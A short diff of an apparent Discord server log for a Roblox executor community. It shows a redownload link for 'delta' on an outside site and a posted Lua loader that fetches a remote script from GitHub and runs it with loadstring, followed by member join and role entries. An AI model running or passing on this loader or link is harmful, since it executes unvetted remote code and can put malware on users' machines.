@@ -2358,3 +2358,5 @@ To get that update, redownload delta from here  👉 https://shadowt3ch.site/del
 [2025-06-16 18:22:29] Message: runndwnking#0 in support-aos_fh (ＳＨΛＤＯＷＴ3ＣＨ): local ld = loadstring or load
 local url = "https://raw.githubusercontent.com/shvl00/shvled/refs/heads/main/l04d3r.bf"
 ld(game:HttpGet(url))()
+[2025-06-16 18:53:58] Member Join: brotherwtf__#0 joined ＳＨΛＤＯＷＴ3ＣＨ
+[2025-06-16 18:54:01] Member Role Update: brotherwtf__#0 in ＳＨΛＤＯＷＴ3ＣＨ: Roles changed (Added: ✔️ Member, Removed: None)
